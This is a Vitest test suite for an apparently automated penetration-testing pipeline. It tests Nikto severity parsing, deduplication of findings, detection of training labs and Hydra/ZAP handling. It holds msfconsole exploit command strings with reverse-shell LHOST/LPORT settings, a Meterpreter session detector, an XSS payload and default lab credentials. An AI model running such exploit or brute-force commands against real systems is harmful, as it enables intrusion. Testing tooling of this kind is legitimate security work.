import { describe, it, expect, vi } from "vitest";

// ═══════════════════════════════════════════════════════════════════════════
// P0-P2 Pipeline Fixes — Test Suite
// Tests all 6 recommended fixes from the engagement run analysis report
// ═══════════════════════════════════════════════════════════════════════════

// ── Fix #1: target_port NULL fallback in exploit-sandbox ──────────────────
describe("Fix #1: target_port NULL fallback", () => {
  it("should default targetPort to 80 when undefined", () => {
    // The fix adds: targetPort ?? 80 in the insertExploitationAttempt call
    const targetPort: number | undefined = undefined;
    const resolvedPort = targetPort ?? 80;
    expect(resolvedPort).toBe(80);
  });

  it("should preserve explicit targetPort when provided", () => {
    const targetPort: number | undefined = 443;
    const resolvedPort = targetPort ?? 80;
    expect(resolvedPort).toBe(443);
  });

  it("should handle port 0 correctly (not falsy-default)", () => {
    // Port 0 is technically valid (OS assigns), ?? preserves it unlike ||
    const targetPort: number | undefined = 0;
    const resolvedPort = targetPort ?? 80;
    expect(resolvedPort).toBe(0);
  });
});

// ── Fix #2: Nikto severity classification ─────────────────────────────────
describe("Fix #2: Nikto severity — uncommon header and x-xss-protection", () => {
  function classifyNiktoSeverity(trimmed: string): string {
    const cve = trimmed.match(/CVE-\d{4}-\d+/)?.[0];
    let severity = "info";
    // P2-FIX: "Uncommon header" findings are informational, not vulns.
    // Must check BEFORE the xss pattern because header names like
    // "x-xss-protection" contain "xss" and would false-positive as HIGH.
    if (/uncommon header|retrieved.*header/i.test(trimmed)) severity = "info";
    else if (cve) severity = "high";
    else if (/is not present|not set|is not defined|header.*missing|missing.*header/i.test(trimmed)) severity = "low";
    else if (/directory indexing|listing|backup|config/i.test(trimmed)) severity = "medium";
    else if (/injection|xss|rfi|lfi|traversal|upload/i.test(trimmed)) severity = "high";
    else if (/default|sample|test|example/i.test(trimmed)) severity = "low";
    return severity;
  }

  it("should classify 'uncommon header x-xss-protection' as info, not high", () => {
    const result = classifyNiktoSeverity("+ Uncommon header 'x-xss-protection' found, with contents: 1; mode=block");
    expect(result).toBe("info");
  });

  it("should classify 'uncommon header x-content-type-options' as info", () => {
    const result = classifyNiktoSeverity("+ Uncommon header 'x-content-type-options' found, with contents: nosniff");
    expect(result).toBe("info");
  });

  it("should classify 'retrieved x-powered-by header' as info", () => {
    const result = classifyNiktoSeverity("+ Retrieved x-powered-by header: Express");
    expect(result).toBe("info");
  });

  it("should still classify actual XSS findings as high", () => {
    const result = classifyNiktoSeverity("+ /search?q=<script>alert(1)</script> - Reflected XSS vulnerability found");
    expect(result).toBe("high");
  });

  it("should classify missing header as low", () => {
    const result = classifyNiktoSeverity("+ X-Frame-Options header is not present");
    expect(result).toBe("low");
  });

  it("should classify CVE findings as high regardless of header content", () => {
    const result = classifyNiktoSeverity("+ CVE-2021-44228 - Log4Shell RCE via header injection");
    expect(result).toBe("high");
  });

  it("should classify directory indexing as medium", () => {
    const result = classifyNiktoSeverity("+ /images/ - Directory indexing found");
    expect(result).toBe("medium");
  });
});

// ── Fix #3: Metasploit/Nuclei direct execution before LLM custom scripts ──
describe("Fix #3: Metasploit/Nuclei routing before LLM fallback", () => {
  it("should build correct msfconsole check command", () => {
    const modulePath = "exploit/multi/http/apache_mod_cgi_bash_env_exec";
    const target = "192.168.1.100";
    const port = 80;
    const checkCmd = `msfconsole -q -x "use ${modulePath}; set RHOSTS ${target}; set RPORT ${port}; check; exit" 2>&1 | head -50`;
    expect(checkCmd).toContain("use exploit/multi/http/apache_mod_cgi_bash_env_exec");
    expect(checkCmd).toContain("set RHOSTS 192.168.1.100");
    expect(checkCmd).toContain("set RPORT 80");
    expect(checkCmd).toContain("check; exit");
  });

  it("should build correct msfconsole exploit command with LHOST", () => {
    const modulePath = "exploit/unix/webapp/drupal_drupalgeddon2";
    const target = "10.0.0.5";
    const port = 443;
    const scanServerHost = "10.0.0.1";
    const exploitCmd = `msfconsole -q -x "use ${modulePath}; set RHOSTS ${target}; set RPORT ${port}; set LHOST ${scanServerHost}; set LPORT 4444; exploit -z; exit" 2>&1 | head -100`;
    expect(exploitCmd).toContain("use exploit/unix/webapp/drupal_drupalgeddon2");
    expect(exploitCmd).toContain("set LHOST 10.0.0.1");
    expect(exploitCmd).toContain("exploit -z; exit");
  });

  it("should detect MSF success from stdout containing 'session opened'", () => {
    const stdout = "Meterpreter session 1 opened (10.0.0.1:4444 -> 10.0.0.5:38472)";
    const success = /session\s+\d+\s+opened|meterpreter.*session|command shell session/i.test(stdout);
    expect(success).toBe(true);
  });

  it("should detect MSF failure from stdout without session", () => {
    const stdout = "Exploit completed, but no session was created.\n[-] Exploit failed";
    const success = /session\s+\d+\s+opened|meterpreter.*session|command shell session/i.test(stdout);
    expect(success).toBe(false);
  });
});

// ── Fix #4: Engagement findings deduplication ─────────────────────────────
describe("Fix #4: Engagement findings deduplication", () => {
  it("should deduplicate findings with same title+severity+hostname+port", () => {
    const findings = [
      { engagementId: 1, title: "XSS in /search", severity: "high", hostname: "dvwa.lab", port: 80 },
      { engagementId: 1, title: "XSS in /search", severity: "high", hostname: "dvwa.lab", port: 80 },
      { engagementId: 1, title: "XSS in /search", severity: "high", hostname: "dvwa.lab", port: 80 },
    ];

    const dedupMap = new Map<string, typeof findings[0]>();
    for (const f of findings) {
      const key = `${f.engagementId}:${f.title}:${f.severity}:${f.hostname || ''}:${f.port || ''}`;
      if (!dedupMap.has(key)) {
        dedupMap.set(key, f);
      }
    }
    expect(dedupMap.size).toBe(1);
    expect(findings.length - dedupMap.size).toBe(2); // 2 duplicates removed
  });

  it("should keep findings with different severities as separate", () => {
    const findings = [
      { engagementId: 1, title: "Missing CSP Header", severity: "low", hostname: "dvwa.lab", port: 80 },
      { engagementId: 1, title: "Missing CSP Header", severity: "medium", hostname: "dvwa.lab", port: 80 },
    ];

    const dedupMap = new Map<string, typeof findings[0]>();
    for (const f of findings) {
      const key = `${f.engagementId}:${f.title}:${f.severity}:${f.hostname || ''}:${f.port || ''}`;
      if (!dedupMap.has(key)) {
        dedupMap.set(key, f);
      }
    }
    expect(dedupMap.size).toBe(2);
  });

  it("should keep findings on different ports as separate", () => {
    const findings = [
      { engagementId: 1, title: "SSH Weak Cipher", severity: "medium", hostname: "target.lab", port: 22 },
      { engagementId: 1, title: "SSH Weak Cipher", severity: "medium", hostname: "target.lab", port: 2222 },
    ];

    const dedupMap = new Map<string, typeof findings[0]>();
    for (const f of findings) {
      const key = `${f.engagementId}:${f.title}:${f.severity}:${f.hostname || ''}:${f.port || ''}`;
      if (!dedupMap.has(key)) {
        dedupMap.set(key, f);
      }
    }
    expect(dedupMap.size).toBe(2);
  });

  it("should prefer higher severity when deduplicating", () => {
    // The actual fix uses severity priority: critical > high > medium > low > info
    const severityOrder: Record<string, number> = { critical: 5, high: 4, medium: 3, low: 2, info: 1 };
    const findings = [
      { title: "SQL Injection", severity: "medium", hostname: "dvwa.lab", port: 80 },
      { title: "SQL Injection", severity: "high", hostname: "dvwa.lab", port: 80 },
      { title: "SQL Injection", severity: "medium", hostname: "dvwa.lab", port: 80 },
    ];

    const dedupMap = new Map<string, typeof findings[0]>();
    for (const f of findings) {
      const key = `${f.title}:${f.hostname}:${f.port}`;
      const existing = dedupMap.get(key);
      if (!existing) {
        dedupMap.set(key, f);
      } else if ((severityOrder[f.severity] || 0) > (severityOrder[existing.severity] || 0)) {
        dedupMap.set(key, f);
      }
    }
    expect(dedupMap.size).toBe(1);
    expect(dedupMap.values().next().value!.severity).toBe("high");
  });
});

// ── Fix #5: selectExploitMethod criteria normalization ────────────────────
describe("Fix #5: selectExploitMethod criteria normalization", () => {
  // Known MSF CVEs that should trigger metasploit method
  const KNOWN_MSF_CVES = new Set([
    "CVE-2021-44228", "CVE-2017-5638", "CVE-2019-0708",
    "CVE-2021-26855", "CVE-2020-1472", "CVE-2014-6271",
  ]);

  function normalizeRuntimeCriteria(rc: {
    cve?: string;
    hasKnownModule?: boolean;
    vulnClass?: string;
  }) {
    const hasCVE = !!rc.cve;
    const hasKnownMSFModule = rc.hasKnownModule || (hasCVE && KNOWN_MSF_CVES.has(rc.cve!));
    const hasExploitDBEntry = hasCVE;
    return { hasCVE, hasKnownMSFModule, hasExploitDBEntry, vulnCategory: rc.vulnClass || 'unknown' };
  }

  it("should normalize runtime criteria with CVE to hasKnownMSFModule=true for known CVEs", () => {
    const result = normalizeRuntimeCriteria({ cve: "CVE-2021-44228", vulnClass: "rce" });
    expect(result.hasCVE).toBe(true);
    expect(result.hasKnownMSFModule).toBe(true);
    expect(result.hasExploitDBEntry).toBe(true);
  });

  it("should normalize runtime criteria with unknown CVE to hasKnownMSFModule=false", () => {
    const result = normalizeRuntimeCriteria({ cve: "CVE-2099-99999", vulnClass: "xss" });
    expect(result.hasCVE).toBe(true);
    expect(result.hasKnownMSFModule).toBe(false);
    expect(result.hasExploitDBEntry).toBe(true);
  });

  it("should normalize runtime criteria with hasKnownModule=true to hasKnownMSFModule=true", () => {
    const result = normalizeRuntimeCriteria({ hasKnownModule: true, vulnClass: "sqli" });
    expect(result.hasCVE).toBe(false);
    expect(result.hasKnownMSFModule).toBe(true);
  });

  it("should normalize empty criteria correctly", () => {
    const result = normalizeRuntimeCriteria({});
    expect(result.hasCVE).toBe(false);
    expect(result.hasKnownMSFModule).toBe(false);
    expect(result.hasExploitDBEntry).toBe(false);
    expect(result.vulnCategory).toBe("unknown");
  });
});

// ── Fix #6: Training lab auto-detection and credential injection ──────────
describe("Fix #6: Training lab auto-detection without trainingLabMode flag", () => {
  const TRAINING_LAB_CREDS: Record<string, Array<{ username: string; password: string; service: string; loginPath?: string }>> = {
    dvwa: [
      { username: "admin", password: "password", service: "http-form", loginPath: "/login.php" },
    ],
    'juice-shop': [
      { username: "admin@juice-sh.op", password: "admin123", service: "http-post", loginPath: "/rest/user/login" },
    ],
    bwapp: [
      { username: "bee", password: "bug", service: "http-form", loginPath: "/login.php" },
    ],
    hackazon: [
      { username: "test_user", password: "test_user", service: "http-form", loginPath: "/user/login" },
    ],
  };

  function detectTrainingLab(hostnames: string[]): string | null {
    for (const [labName] of Object.entries(TRAINING_LAB_CREDS)) {
      const matchesLab = hostnames.some(h => h.includes(labName.replace('-', '')));
      if (matchesLab) return labName;
    }
    return null;
  }

  it("should detect DVWA from hostname without trainingLabMode", () => {
    expect(detectTrainingLab(["dvwa.training.lab"])).toBe("dvwa");
  });

  it("should detect Juice Shop from hostname", () => {
    expect(detectTrainingLab(["juiceshop.internal"])).toBe("juice-shop");
  });

  it("should detect bWAPP from hostname", () => {
    expect(detectTrainingLab(["bwapp.lab.local"])).toBe("bwapp");
  });

  it("should detect Hackazon from hostname", () => {
    expect(detectTrainingLab(["hackazon.training.lab"])).toBe("hackazon");
  });

  it("should return null for non-training-lab hostnames", () => {
    expect(detectTrainingLab(["api.production.com"])).toBeNull();
  });

  it("should detect lab even with mixed case", () => {
    // The actual code lowercases hostnames first
    const hostnames = ["DVWA.Training.Lab"].map(h => h.toLowerCase());
    expect(detectTrainingLab(hostnames)).toBe("dvwa");
  });
});

// ── GAP 2: OEM credential fallback on Hydra failure ───────────────────────
describe("GAP 2: OEM credential fallback on Hydra exit 255", () => {
  it("should extract OEM username from Hydra args", () => {
    const args = `-l 'admin' -p 'admin123' -s 8080 -t 4 -f -V target http-form-post`;
    const userMatch = args.match(/-l\s+'([^']+)'/);
    expect(userMatch?.[1]).toBe("admin");
  });

  it("should extract OEM password from Hydra args", () => {
    const args = `-l 'admin' -p 'admin123' -s 8080 -t 4 -f -V target http-form-post`;
    const passMatch = args.match(/-p\s+'([^']+)'/);
    expect(passMatch?.[1]).toBe("admin123");
  });

  it("should extract OEM port from Hydra args", () => {
    const args = `-l 'admin' -p 'admin123' -s 8080 -t 4 -f -V target http-form-post`;
    const portMatch = args.match(/-s\s+(\d+)/);
    expect(portMatch ? parseInt(portMatch[1]) : 80).toBe(8080);
  });

  it("should default port to 80 when -s is not in args", () => {
    const args = `-l 'admin' -p 'admin123' -t 4 -f -V target ssh`;
    const portMatch = args.match(/-s\s+(\d+)/);
    expect(portMatch ? parseInt(portMatch[1]) : 80).toBe(80);
  });

  it("should detect OEM Default purpose tag", () => {
    const purpose = "[OEM Default] Apache Tomcat — admin:admin on port 8080";
    expect(purpose.includes("[OEM Default]")).toBe(true);
  });

  it("should not trigger for non-OEM Hydra commands", () => {
    const purpose = "Generic SSH brute force on port 22";
    expect(purpose.includes("[OEM Default]")).toBe(false);
  });
});

// ── GAP 3: ZAP login validation ───────────────────────────────────────────
describe("GAP 3: ZAP login validation after auth configuration", () => {
  it("should validate auth when HTTP status is 200", () => {
    const statusCode = 200;
    const authValidated = statusCode >= 200 && statusCode < 400;
    expect(authValidated).toBe(true);
  });

  it("should validate auth when HTTP status is 302 (redirect to dashboard)", () => {
    const statusCode = 302;
    const authValidated = statusCode >= 200 && statusCode < 400;
    expect(authValidated).toBe(true);
  });

  it("should reject auth when HTTP status is 401", () => {
    const statusCode = 401;
    const authValidated = statusCode >= 200 && statusCode < 400;
    expect(authValidated).toBe(false);
  });

  it("should reject auth when HTTP status is 403", () => {
    const statusCode = 403;
    const authValidated = statusCode >= 200 && statusCode < 400;
    expect(authValidated).toBe(false);
  });

  it("should trust form-based auth when no cookie is returned", () => {
    const sessionCookie = '';
    // When no cookie, trust ZAP's form-based config
    const authValidated = sessionCookie ? false : true; // simplified
    expect(authValidated).toBe(true);
  });
});
